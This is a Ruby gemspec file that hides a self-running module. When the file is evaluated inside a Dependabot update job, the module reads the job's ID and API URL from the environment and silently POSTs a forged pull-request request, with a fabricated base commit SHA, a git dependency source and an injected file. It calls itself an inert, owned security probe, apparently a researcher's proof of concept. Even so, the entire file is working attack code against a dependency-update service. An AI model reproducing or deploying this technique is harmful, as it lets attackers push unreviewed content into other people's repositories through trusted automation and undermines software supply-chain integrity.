# frozen_string_literal: true

require "json"
require "net/http"
require "uri"

module OwnedDependabotPrCheckProbe
  FORGED_BASE_SHA = "4163fd0a9a54e11e1c6ebf118873db3c39a0ab1a"

  module_function

  def run
    job_id = ENV["DEPENDABOT_JOB_ID"]
    api_base = ENV["DEPENDABOT_API_URL"]
    return if job_id.to_s.empty? || api_base.to_s.empty?

    marker = "/tmp/owned-dependabot-pr-check-#{job_id}"
    File.open(marker, File::WRONLY | File::CREAT | File::EXCL, 0o600) {}

    endpoint = URI("#{api_base.sub(%r{/*$}, "")}/update_jobs/#{job_id}/create_pull_request")
    request = Net::HTTP::Post.new(endpoint.request_uri)
    request["Content-Type"] = "application/json"
    request.body = JSON.generate(payload)
    client = Net::HTTP::Proxy(:ENV).new(endpoint.host, endpoint.port)
    client.use_ssl = true
    client.open_timeout = 10
    client.read_timeout = 30
    client.request(request)
  rescue Errno::EEXIST
    nil
  rescue StandardError
    nil
  end

  def payload
    requirement = {
      "file" => "Gemfile",
      "requirement" => ">= 0",
      "groups" => [],
      "source" => {
        "type" => "git",
        "url" => "https://github.com/downgraded/codeload-owned-probe-20261030-91f64a2c",
        "branch" => "main",
        "ref" => nil,
      },
    }
    {
      "data" => {
        "dependencies" => [{
          "name" => "owned_dependabot_pr_check_probe_20261101",
          "version" => "0.0.18",
          "previous-version" => "0.0.17",
          "requirements" => [requirement],
          "previous-requirements" => [requirement],
          "directory" => "/",
        }],
        "updated-dependency-files" => [{
          "name" => "vendor/owned-dependabot-pr-check-control.txt",
          "content" => "Owned inert PR workflow-selection control.\n",
          "directory" => "/",
          "type" => "file",
          "support_file" => false,
          "content_encoding" => "utf-8",
          "deleted" => false,
          "operation" => "create",
        }],
        "base-commit-sha" => FORGED_BASE_SHA,
        "commit-message" => "test: owned Dependabot PR workflow parent control",
        "pr-title" => "Owned Dependabot PR workflow parent control",
        "pr-body" => "Owned security test. The inherited workflow has permissions disabled and prints one inert marker. Do not merge.",
      },
    }
  end
end

OwnedDependabotPrCheckProbe.run

Gem::Specification.new do |spec|
  spec.name = "owned_dependabot_remote_probe"
  spec.version = "0.0.18"
  spec.summary = "Owned Dependabot security probe"
  spec.authors = ["Owned Security Test"]
  spec.files = []
end
